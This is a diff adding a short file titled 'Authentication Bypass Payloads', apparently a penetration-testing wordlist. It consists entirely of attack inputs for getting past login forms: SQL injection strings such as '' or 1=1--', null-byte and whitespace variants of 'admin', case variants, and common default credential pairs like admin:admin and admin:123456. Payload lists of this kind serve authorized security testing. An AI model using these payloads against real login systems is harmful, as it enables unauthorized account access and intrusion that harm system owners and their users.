@@ -1,0 +1,30 @@
+# Authentication Bypass Payloads
+
+## SQL Injection Based
+admin'--
+admin' #
+admin'/*
+' or 1=1--
+' or '1'='1
+' or 1=1#
+
+## Null Byte
+admin%00
+admin%00'
+
+## Tabs and Spaces
+admin    (tab)
+admin (space)
+
+## Case Manipulation
+ADMIN
+Admin
+aDmIn
+
+## Common Credentials
+admin:admin
+admin:password
+admin:123456
+admin:12345678
+test:test
+guest:guest
